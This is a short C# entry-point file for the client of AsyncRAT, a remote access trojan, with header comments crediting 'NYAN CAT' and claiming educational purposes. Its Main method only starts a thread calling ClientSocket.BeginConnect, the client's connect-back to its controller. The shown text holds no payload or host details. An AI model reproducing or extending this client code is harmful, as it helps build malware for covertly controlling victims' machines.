using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Client
{
    public class Program
    {

        // 

        // │ Author     : NYAN CAT
        // │ Name       : AsyncRAT

        // Contact Me   : https://github.com/NYAN-x-CAT

        // This program Is distributed for educational purposes only.

        // 

        public static void Main()
        {
            System.Threading.Thread T = new System.Threading.Thread(ClientSocket.BeginConnect);
            T.Start();
        }
    }

}
